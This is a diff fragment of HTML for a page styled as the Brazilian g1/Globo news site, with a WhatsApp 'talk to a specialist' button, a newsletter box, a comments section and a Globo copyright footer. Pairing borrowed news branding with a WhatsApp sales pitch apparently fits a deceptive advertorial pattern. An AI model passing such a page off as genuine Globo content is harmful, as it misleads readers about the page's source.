+        <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M17.47 14.38c-.29-.15-1.72-.85-1.99-.95-.27-.1-.46-.15-.65.15-.2.29-.75.95-.92 1.14-.17.2-.34.22-.63.07-.29-.15-1.24-.46-2.36-1.46-.87-.78-1.46-1.74-1.63-2.03-.17-.29-.02-.45.13-.6.13-.13.29-.34.44-.51.15-.17.2-.29.29-.49.1-.2.05-.37-.02-.52-.07-.15-.65-1.57-.9-2.14-.24-.56-.48-.49-.65-.5H8.5c-.17 0-.44.07-.67.32-.23.25-.88.86-.88 2.1 0 1.24.9 2.44 1.03 2.61.13.17 1.78 2.72 4.31 3.81.6.26 1.07.41 1.44.53.6.19 1.15.16 1.59.1.48-.07 1.49-.61 1.7-1.2.21-.58.21-1.08.15-1.19-.07-.1-.25-.16-.54-.31zM12.05 21.8h-.03a9.87 9.87 0 01-5.03-1.38l-.36-.21-3.74.98 1-3.65-.24-.37A9.86 9.86 0 012.18 12 9.87 9.87 0 0112.05 2.2 9.87 9.87 0 0121.91 12a9.87 9.87 0 01-9.86 9.8zM12.05 0A12.05 12.05 0 000 12c0 2.13.56 4.22 1.62 6.06L.05 24l6.1-1.6A12.05 12.05 0 1012.05 0z"/></svg>
+        <div class="whatsapp-cta-text">
+          <span class="whatsapp-cta-label">Atendimento gratuito — resposta em minutos</span>
+          <span class="whatsapp-cta-title">Falar com especialista pelo WhatsApp</span>
+        </div>
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M9 18l6-6-6-6" stroke="white" stroke-width="2" fill="none"/></svg>
+      </a>
+    </div>
+
+    <!-- NEWSLETTER -->
+    <div class="newsletter-box">
+      <div class="newsletter-text">
+        <h3>Resumo do dia</h3>
+        <p>De segunda a sábado, as notícias que você não pode perder diretamente no seu e-mail.</p>
+        <button class="newsletter-btn">
+          <svg width="14" height="14" viewBox="0 0 14 14" fill="white"><rect x="1" y="3" width="12" height="9" rx="1" stroke="white" stroke-width="1.5" fill="none"/><path d="M1 4l6 5 6-5" stroke="white" stroke-width="1.5" fill="none"/></svg>
+          Inscreva-se e receba a newsletter
+        </button>
+        <p class="newsletter-note">Para se inscrever, entre ou crie uma conta na Globo gratuita.</p>
+      </div>
+    </div>
+
+    <!-- COMENTÁRIOS -->
+    <div class="comments-section">
+      <h2>Comentários</h2>
+      <p>Seja o primeiro a comentar!</p>
+      <div class="comments-login-box">
+        <p>Acesse sua Conta Globo e participe da conversa.</p>
+        <a href="#" class="btn-login">Clique aqui para fazer login</a>
+      </div>
+    </div>
+
+  </div><!-- fim .article-wrapper -->
+</div><!-- fim .page-wrapper -->
+
+<!-- FOOTER -->
+<footer class="site-footer">
+  <span class="footer-logo">g1</span>
+  <div class="footer-links">
+    <a href="#">Últimas Notícias</a>
+    <a href="#">princípios editoriais</a>
+    <a href="#">política de privacidade</a>
+    <a href="#">minha conta</a>
+    <a href="#">anuncie conosco</a>
+  </div>
+  <p class="footer-copy">© 2026 Globo Comunicação e Participações S.A.</p>
+</footer>
+
+</body>
+</html>
